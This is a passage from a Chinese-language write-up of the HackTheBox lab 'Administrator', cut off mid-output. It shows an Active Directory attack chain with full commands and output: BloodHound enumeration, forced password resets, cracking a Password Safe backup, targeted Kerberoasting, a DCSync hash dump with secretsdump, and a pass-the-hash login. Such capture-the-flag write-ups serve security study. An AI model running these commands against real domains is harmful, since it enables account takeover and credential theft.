errors.</span><br></pre></td></tr></table></figure><p><code>olivia</code>为当前使用的用户，其余为域内的其他用户</p><h3 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h3><h4 id="BloodHound-提取域信息"><a href="#BloodHound-提取域信息" class="headerlink" title="BloodHound 提取域信息"></a>BloodHound 提取域信息</h4><p>使用工具<code>bloodhound.py</code>从域中提取信息</p><p>BloodHound工具链接：<a href="https://github.com/BloodHoundAD/BloodHound/releases">https://github.com/BloodHoundAD/BloodHound/releases</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/BloodHound-linux-x64]</span><br><span class="line">└─# bloodhound-python  -d administrator.htb -ns 10.10.11.42 -u &#x27;Olivia&#x27; -p ichliebedich -c All --zip</span><br><span class="line">INFO: Found AD domain: administrator.htb</span><br><span class="line">INFO: Getting TGT for user</span><br><span class="line">WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes</span><br><span class="line">INFO: Connecting to LDAP server: dc.administrator.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains in the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc.administrator.htb</span><br><span class="line">INFO: Found 11 users</span><br><span class="line">INFO: Found 53 groups</span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: dc.administrator.htb</span><br><span class="line">WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.42:445)] timed out</span><br><span class="line">WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.</span><br><span class="line">INFO: Done in 01M 14S</span><br><span class="line">INFO: Compressing output into 20241214163637_bloodhound.zip</span><br></pre></td></tr></table></figure><p>运行此命令后，我们获得了压缩包<code>20241214163637_bloodhound.zip</code>，它包含了域中的所有关键信息。</p><p>接下来，我们使用<code>sudo neo4j start</code>命令启动数据库，并使用<code>bloodhound</code>命令进入工具。将得到的zip压缩包拖入到Bloodhound中上传文件。账号neo4j 密码123456</p><p>我们当前用户为<code>Olivia</code>，因此查看一下节点信息，左上角搜索Olivia，olivia有一个<code>First Degreee object control</code>(一级对象控制，接下来简称FDOC)，点击它可以看到olivia对用户michael拥有<code>GenericAll权限</code>。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734168252003-eb4fd5bf-abcd-403b-a19e-b0a6c26f8934.png"></p><h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><h5 id="Olivia-michael"><a href="#Olivia-michael" class="headerlink" title="Olivia-&gt;michael"></a>Olivia-&gt;michael</h5><p>GenericAll 权限相当于“完全控制”权限，意味着 olivia 可以完全控制 michael 用户，包括修改密码和组成员等操作。</p><p>使用<code>evil-winrm</code>登录<code>olivia</code>用户，修改域内用户<code>michael</code>的密码为<code>michael</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\olivia\Documents&gt; net user michael michael /domain </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>成功登录，拿下<code>michael</code>用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/HTB/Administrator]</span><br><span class="line">└─# evil-winrm -i 10.10.11.42 -u &#x27;michael&#x27; -p &#x27;michael&#x27;</span><br><span class="line">*Evil-WinRM* PS C:\Users\michael\Documents&gt; whoami</span><br><span class="line">administrator\michael</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734168422913-bead28a8-64b4-41e3-897a-32cccbfbd8d7.png"></p><h5 id="michael-benjamin"><a href="#michael-benjamin" class="headerlink" title="michael-&gt;benjamin"></a>michael-&gt;benjamin</h5><p>ForceChangePassword</p><p>打开bloodhound，查看<code>michael</code>用户，发现该用户也有一个FDOC，并且该FDOC对<code>benjamin</code>用户具有<code>ForceChangePassword</code>权限，即可以强制更改<code>benjamin</code>的密码。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734168679332-60dc56c5-0297-44d4-aee9-a571c6f0bdf8.png"></p><p>ftp登录benjamin</p><p>在<code>bloodhound</code>中查看<code>benjamin</code>没有任何权限，但是他是<code>share Moderator</code>组的成员，可以尝试一下<code>ftp</code>连接</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734168926833-e9c62747-0bf6-411e-8eba-19656aadb99e.png"></p><p>接下来使用ftp登录<code>michael</code>账户，</p><p>ftp</p><p>rpcclient</p><p><a href="https://www.secrss.com/articles/48320">https://www.secrss.com/articles/48320</a></p><p>先修改密码</p><h5 id="benjamin-emily"><a href="#benjamin-emily" class="headerlink" title="benjamin-&gt;emily"></a>benjamin-&gt;emily</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD -u &quot;michael&quot; -p &quot;michael&quot; -d &quot;Administrator.htb&quot; --host &quot;10.10.11.42&quot; set password &quot;benjamin&quot; &quot;12345678&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/HTB/Administrator]</span><br><span class="line">└─# rpcclient -U michael 10.10.11.42</span><br><span class="line">Password for [WORKGROUP\michael]:</span><br><span class="line">rpcclient $&gt; setuserinfo2 benjamin 23 &#x27;benjamin&#x27;</span><br><span class="line">rpcclient $&gt; exit</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/BloodHound-linux-x64]</span><br><span class="line">└─# ftp benjamin@10.10.11.42</span><br><span class="line">Connected to 10.10.11.42.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">331 Password required</span><br><span class="line">Password: </span><br><span class="line">230 User logged in.</span><br><span class="line">Remote system type is Windows_NT.</span><br></pre></td></tr></table></figure><p>ftp登录之后，查看一下当前目录下的文件，发现一个备份文件<code>Backup.psafe3</code>，将它下载下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; dir</span><br><span class="line">ftp&gt; binary  #切换成二进制模式传输文件</span><br><span class="line">200 Type set to I.</span><br><span class="line">ftp&gt; get Backup.psafe3</span><br><span class="line">local: Backup.psafe3 remote: Backup.psafe3</span><br><span class="line">229 Entering Extended Passive Mode (|||51246|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">100% |**********************************************************************************************|   952        0.77 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">952 bytes received in 00:01 (0.77 KiB/s)</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734169943968-96a14c7b-6c34-4c33-a401-cb42f0b3d7a7.png"></p><p>在哪打开终端就会下到哪个目录下</p><p>psafe3 文件是加密的密码安全文件</p><p>无法直接读取，需要使用 <code>pwsafe2john</code> 工具进行获取 hash，卡 kali 自带有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Administrator]</span><br><span class="line">└─# pwsafe2john Backup.psafe3  </span><br><span class="line">Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050</span><br></pre></td></tr></table></figure><p>拿到 hash，尝试进行解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Administrator]</span><br><span class="line">└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 AVX 4x])</span><br><span class="line">Cost 1 (iteration count) is 2048 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">tekieromucho     (Backu)     </span><br><span class="line">1g 0:00:00:00 DONE (2024-12-05 23:24) 4.761g/s 29257p/s 29257c/s 29257C/s newzealand..iheartyou</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734170433273-6bbaf1e7-77d7-4785-a511-a82311921ab8.png"></p><p>用本机的软件</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734171146786-b9d44411-5cc5-4587-98d9-6f49a1cbb63a.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw</span><br><span class="line">emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb</span><br><span class="line">emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur</span><br></pre></td></tr></table></figure><p>得到<code>emily</code>的密码为：<code>UXLCI5iETUsIBoFVTj8yQFKoHjXmb</code></p><p>使用<code>evil-winrm</code>登录<code>emily</code>用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/HTB/Administrator]</span><br><span class="line">└─# evil-winrm -i 10.10.11.42 -u &#x27;emily&#x27; -p &#x27;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#x27;</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\emily\Documents&gt; whoami</span><br><span class="line">administrator\emily</span><br></pre></td></tr></table></figure><p>成功拿下emily权限，进入桌面目录，拿下第一个flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\emily\Documents&gt; cd ..\Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\emily\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\emily\Desktop</span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk</span><br><span class="line">-ar---         12/7/2024  12:20 AM             34 user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\emily\Desktop&gt; cat user.txt</span><br><span class="line">888ac3b3d60b08fa502ca90c9e90d506</span><br></pre></td></tr></table></figure><h5 id="emily-ethan"><a href="#emily-ethan" class="headerlink" title="emily-&gt;ethan"></a>emily-&gt;ethan</h5><p>再次查看<code>bloodhound</code>，<code>emily</code>有一个FDOC，对用户<code>ethan</code>拥有<code>GenericWrite</code>权限。</p><p>在 Active Directory (AD) 环境中，GenericWrite 是一种权限，允许攻击者对目标账户的属性进行修改。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734171554355-7f2a77cf-4151-42f7-a7c7-bd92bbde3ba5.png"></p><p>这里介绍一下<code>Kerberoasting攻击</code></p><p>Kerberos 协议在处理身份验证时，允许域内用户为拥有 <code>SPN</code>(Service Principal Name，标识服务实例的唯一名称) 的账户请求服务票据。</p><p>这些票据通常是由账户的 NTLM 哈希加密生成的，只要域账户注册了<code>SPN</code>，攻击者就可以使用<code>Kerberos</code>请求服务票据并提取票据。因此攻击者可以通过离线破解服务票据(例如使用工具 <code>PowerView</code> 或 <code>GetUserSPNs.py</code>)间接得到目标账户的密码。</p><p>但是这里我们没有看到<code>ethan</code>用户注册<code>SPN</code>，因此我们只能通过<code>GenericWrite</code>为<code>ethan</code>用户创建一个<code>SPN</code>，然后请求一个票据并使用<code>targetedKerberoast.py</code>破解它。</p><p>targetedKerberoast.py下载链接：<a href="https://github.com/ShutdownRepo/targetedKerberoast">https://github.com/ShutdownRepo/targetedKerberoast</a></p><p>先更新一下时间，不然会有时差，导致破解失败</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─# ntpdig 10.10.11.42</span><br><span class="line">2024-12-15 02:22:47.084508 (+0800) +25206.101334 +/- 0.209603 10.10.11.42 s1 no-leap</span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─# ntpdate 10.10.11.42</span><br><span class="line">2024-12-15 02:23:04.429985 (+0800) +25206.072243 +/- 0.240176 10.10.11.42 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 25206.072243</span><br></pre></td></tr></table></figure><p>创建SPN</p><p>Set-ADUser -Identity ethan -ServicePrincipalNames @{ADD&#x3D;”opsSPN&#x2F;host”}</p><p>破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/targetedKerberoast-main]</span><br><span class="line">└─# python targetedKerberoast.py -u &quot;emily&quot; -p &quot;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&quot; -d &quot;Administrator.htb&quot; --dc-ip 10.10.11.42</span><br><span class="line">[*] Starting kerberoast attacks</span><br><span class="line">[*] Fetching usernames from Active Directory with LDAP</span><br><span class="line">[+] Printing hash for (ethan)</span><br><span class="line">$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$Administrator.htb/ethan*$c272d2d4f6c0ecab1c52f9c3a61a7752$80ac44b67f02b88210f31a575ec0c3e8ef7a74fa05eea49a2afe46ae6a8085a0c8fc51ab9f1d0ae4849aae9dd2880b46a2cf1f7a1c9b2ba5639cb58c0f7e4e2b5474cda1e70fae234f89807cc8d2b7972079899077da12b0a662439fd592504c4d942759de88d5b8f93ee57f3306444ceba8b69c934d9ad5de4d98fe198b63fcda638a2b2dde3b246b7e34974e600c843c44ed41034ada89298d3081ba78d23aca4adad45aa123840df2de7ddab67f0138ca0c96dc712a927e5dbc2123709f7c5873f025912727e2212671ad3f5f37a10e6fd65cf93ac77d514acd615f105f977eb6afb1ab3917415f0a86f21137569fa23131d295be7478e34c29048fadf4875a2029e89d7c10f743e589521982eb9928beb8df8b1273c44eac940910aea9fbb046900897eac2476d33874ce71713016a7f879fcdedcdacdcc1d079fceb0235d909e77416760aa14918853bca87d9801ea1364bb8bfa9b9ff8bdfaae3a227d214832c8c8c787ea304e0aaa43828428b5f976569b8aa809adbdecc775f2edb41b2276b895ccc189675eae246123f5e903bb6cf5c35f641a244698a405999faae73096ad9bbee2e9d5427e2ac169350d5172578482327a326708d019348520750a144a90f7684aa4a2557ede1bb4ba25a6a2ed9bfc24acee897e8cd52db8e10232518e8201dc5b39317ea892ae6b4db81a1e75c70bf99b8b3d8b83a35bd664a8e387e1ae092844dc62420c418b9b3790071908d9131b79e242bfd33489318278460ed861ce63b3c51a3cf7f4b6122083db3e30dcd9a4e088ddda78d9bf337d0e1ede8192e0aa6ddc436a658f8ab92c4a7c4684352dd873159cbb830d703f46b7f2f86d63f5f512867a3298df24f7ffa7276865fc5e8affa0944b44e7691482e66934b8f32cbe4b6033a1145164b2c12dbc1f6ccec70076b61dc21f40f7f9b22f3daf6cacab4073dd5365f617255df7fb89b948e41c12fdd251508ed2c537a268595a10f012b5ca1b783dbdc238b375b215404dee90122627e1cbd8982fcc34fef8f0c0073f4391aff527e5be543ce4678bdc22b8bd1a7373b017680060552ea8a2f703a9fdfaf4f81370f9b5d3c21d2f50e3975c2246965047642679258a429adcf05ec61dfb6852148b53cdb741e752d0d716625956c4504e99a915bdb27cba9970e6ae8f5af1249fef2a3c8c935daae78e1413378894c4f18429b7cee5fdb3e9dabd30155253e0efe850f47baea504f3b74247617d62de7a482ad245b1d5d43fdbf2ddabc18e7da4a381cdf51f9d2d6d2c953bbfd73e57af2e59dcec4194cf03cf8ca8e8098319c2941069d0b11fab87292e0ef94aad811b662c541d25dcb629b1466d4133cfec0e5f9c21180cc74e80170707fd45cff021430187b4cfcdc5120f568567ad80f8a705446cb355ed2d49af31fe8825e65e5dcdc659fd78d4856f89a8ea2179fd30b9c802d3a16b378c6ab39c738de3d454b2649f2e6a33f7fdec9c866ca59f3fc50924aa5a21e7a4a4852cd159aca2c03d0f100b355a21ee9</span><br></pre></td></tr></table></figure><p>解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Administrator]</span><br><span class="line">└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">limpbizkit       (?)     </span><br><span class="line">1g 0:00:00:00 DONE (2024-12-06 17:35) 100.0g/s 512000p/s 512000c/s 512000C/s newzealand..babygrl</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734175893236-95d7ed55-3eee-4c84-a028-55cec189d4c9.png">得到 Ethan 的密码：<code>limpbizkit</code></p><h5 id="Ethan-Administrator"><a href="#Ethan-Administrator" class="headerlink" title="Ethan-&gt;Administrator"></a>Ethan-&gt;Administrator</h5><p>现在我们已经获取了<code>ethan</code> 的密码，使用 BloodHound 检查他的权限。发现<code>ethan</code> 的 FDOC权限间接赋予了他在域控制器 (Domain Controller, DC) 上的<code>DCSync</code>权限。</p><p>DCSync 是一种滥用 Active Directory (AD) 复制机制的攻击技术。拥有 DCSync 权限的用户可以模拟域控制器，向其他 DC 请求复制敏感数据，如 NTLM 哈希和 Kerberos 密钥。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1734176432890-2d7999a1-2f33-4d75-a09f-e22efaf18d64.png"></p><p>借助<code>DCSync</code>，使用<code>impacket-secretsdump</code>转储域控制器上的所有密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/BloodHound-linux-x64]</span><br><span class="line">└─# impacket-secretsdump ethan:limpbizkit@10.10.11.42</span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::</span><br><span class="line">administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::</span><br><span class="line">administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:e55bcd70f1b548fc4304ebd8a3f2f2f7:::</span><br><span class="line">administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::</span><br><span class="line">administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::</span><br><span class="line">administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::</span><br><span class="line">administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::</span><br><span class="line">administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::</span><br><span class="line">DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2</span><br><span class="line">Administrator:des-cbc-md5:403286f7cdf18385</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94</span><br><span class="line">krbtgt:des-cbc-md5:2c0bc7d0250dbfc7</span><br><span class="line">administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3</span><br><span class="line">administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48</span><br><span class="line">administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9</span><br><span class="line">administrator.htb\michael:aes256-cts-hmac-sha1-96:dec0f5eac8b174633aa1449c41abdd0170098d31f2c38242675c6ad80873a229</span><br><span class="line">administrator.htb\michael:aes128-cts-hmac-sha1-96:4d614f91ce0d82e332d76139b19ec03b</span><br><span class="line">administrator.htb\michael:des-cbc-md5:49f10d5d97f19d5d</span><br><span class="line">administrator.htb\benjamin:aes256-cts-hmac-sha1-96:e110f75337181474608f51a5b22d8198d3fa56d68633b384b7136d4496c89337</span><br><span class="line">administrator.htb\benjamin:aes128-cts-hmac-sha1-96:aa2b24ac2fb879262faa4f6ca294f332</span><br><span class="line">administrator.htb\benjamin:des-cbc-md5:1a4f0bce2343cebf</span><br><span class="line">administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4</span><br><span class="line">administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218</span><br><span class="line">administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51</span><br><span class="line">administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f</span><br><span class="line">administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f</span><br><span class="line">administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb</span><br><span class="line">administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6</span><br><span class="line">administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade</span><br><span class="line">administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf</span><br><span class="line">administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82</span><br><span class="line">administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e</span><br><span class="line">administrator.htb\emma:des-cbc-md5:3249fba89813ef5d</span><br><span class="line">DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb</span><br><span class="line">DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d</span><br><span class="line">DC$:des-cbc-md5:f483547c4325492a</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure><p>现在已经拥有了<code>Administrator</code>的哈希值，使用<code>evil-winrm</code>登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/secretsdump.py-main]</span><br><span class="line">└─# evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami</span><br><span class="line">administrator\administrator</span><br></pre></td></tr></table></figure><p>成功登录<code>administrator</code>用户，切换到桌面目录，发现root.txt，拿下第二个flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..\Desktop</span><br><span 